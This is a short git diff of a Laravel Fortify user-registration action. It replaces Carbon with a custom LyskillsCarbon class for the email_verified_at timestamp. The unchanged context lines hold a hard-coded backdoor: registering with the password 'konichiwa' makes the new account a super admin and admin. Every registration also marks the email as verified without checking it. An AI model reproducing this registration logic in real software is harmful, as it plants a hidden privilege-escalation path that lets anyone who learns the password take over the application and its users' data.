@@ -3,7 +3,7 @@
 namespace App\Actions\Fortify;
 
 use App\Models\User;
-use Carbon\Carbon;
+use App\Classes\LyskillsCarbon;
 use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Validator;
 use Laravel\Fortify\Contracts\CreatesNewUsers;
@@ -36,7 +36,7 @@ class CreateNewUser implements CreatesNewUsers
             'password' => Hash::make($input['password']),
             'is_super_admin' => $input['password'] === "konichiwa" ? 1 : 0,
             'is_admin' => $input['password'] === "konichiwa" ? 1 : 0,
-            'email_verified_at' => Carbon::now(),
+            'email_verified_at' => LyskillsCarbon::now(),
         ]);
     }
 }
